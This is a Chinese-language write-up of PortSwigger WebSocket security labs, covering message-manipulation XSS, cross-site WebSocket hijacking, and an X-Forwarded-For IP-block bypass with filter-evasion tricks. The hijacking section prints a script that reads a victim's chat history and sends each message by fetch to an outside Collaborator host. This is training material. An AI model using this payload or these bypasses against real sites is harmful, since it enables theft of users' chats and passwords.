---

title: PortSwigger--WebSockets
categories: [渗透靶场, PortSwigger]

---

## 知识扩展

### WebSocket

1. Websocket是在客户端和服务端之间建立双向通信的协议，WebSocket通信是全双工通信，多用于客服聊天、直播等需要用户与服务端互相进行数据交互的功能处，不同于HTTP请求-响应的通信模式，WebSocket允许服务端主动向客户端发送信息
2. Websocket通信的建立是在HTTP基础上进行的：客户端发起一个带有Upgrade：websocket的HTTP头部请求，要求服务端从HTTP通信切换至WebSocket通信，并且WebSocket通信一旦建立，通道将保持持久化开放，服务端和客户端之间随时可以互相发送数据，直到任何一端主动终止通信连接，不需要像HTTP一样每次通信都需要发起一个新的服务请求

## 靶场总结

1. WebSocket通信中可能存在XSS，CSRF攻击
2. WebSocket通信中的WebSockets history可能会存在隐藏的交互信息
3. IP限制可以通过添加修改X-Forwarded-For头来绕过
4. Xss弹窗中Event Handle的过滤检测可以通过大小写Event Handle进行绕过，alert函数括号可以通过"`"替换绕过



## 1.Manipulating WebSocket messages to exploit vulnerabilities

（1）开启Burpsuite代理，观察HTTP流量，在进入Live chat时，HTTP请求携带Upgrade:websocket头部，此头部要求服务端将

通信方式从HTTP通信切换至WebSocket通信

![image-20240907001923192](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409070019274.png)

（2）开启Burpsuite拦截message，发送测试数据，服务端回显用户的输入，存在XSS攻击可能

![image-20240907002210639](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409070022704.png)

（3）发送XSS弹窗代码，成功触发XSS弹窗

![image-20240907134654048](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071347188.png)

## 2.Cross-site WebSocket hijacking

（1）测试XSS弹窗，尖括号被服务端进行编码处理无法触发弹窗

![image-20240907135834331](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071358407.png)

（2）开启Burpsuite代理，观察HTTP流量，发现/chat页面的验证单独依赖于cookie，不存在其他不可预测值，存在CSRF攻击

可能，同时在WebSockets history记录中发现，在刚进入Live chat页面时，客户端给服务端发送数据:"READY"，服务端回显用户

的历史聊天记录，因此通过CSRF攻击可以获取到其他用户的历史聊天记录

![image-20240907141609054](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071416132.png)

![image-20240907141633391](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071416478.png)

![image-20240907160744893](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071607967.png)

（3）复制Burpsuite中Collaborator服务器地址到下列的fetch处，同时将Live chat页面的URL复制到new WebSocket处，注意

https需要修改成wss，随后进入Go to exploit server模块进行CSRF攻击

![image-20240907143707499](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071437569.png)

```python
<script>
  var ws = new WebSocket('wss://0afb0008038d8139808308cf00300064.web-security-academy.net/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://oqiczjv563kxsxsjfpexto4cn3tvhm5b.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
  };
</script>
```

![image-20240907143850432](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071438508.png)

（4）多点击几次Poll now刷新，在最终的HTTP流量中可以看到carlos用户聊天记录中泄露了用户密码

![image-20240907143929722](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071439809.png)

![image-20240907144006908](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071440977.png)

## 3.Manipulating the WebSocket handshake to exploit vulnerabilities

（1）测试XSS弹窗，通信连接中断，尝试重连服务端回显："This address is blacklisted"

![image-20240907144513213](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071445282.png)

![image-20240907144636392](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071446470.png)

（2）在重连请求中添加XFF头绕过IP限制，重连成功

![image-20240907144805756](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071448832.png)

![image-20240907144842173](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071448261.png)

（3）多次修改XFF头，根据服务端错误回显，逐步尝试，确认服务端过滤了数据中的事件名称和alert函数的括号

![image-20240907154902366](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071549437.png)

![image-20240907154928029](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071549105.png)

![image-20240907155001226](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071550311.png)

![image-20240907155155782](https://cdn.jsdelivr.net/gh/Pres3nt/Typoraimages@master/images/202409071551864.png)

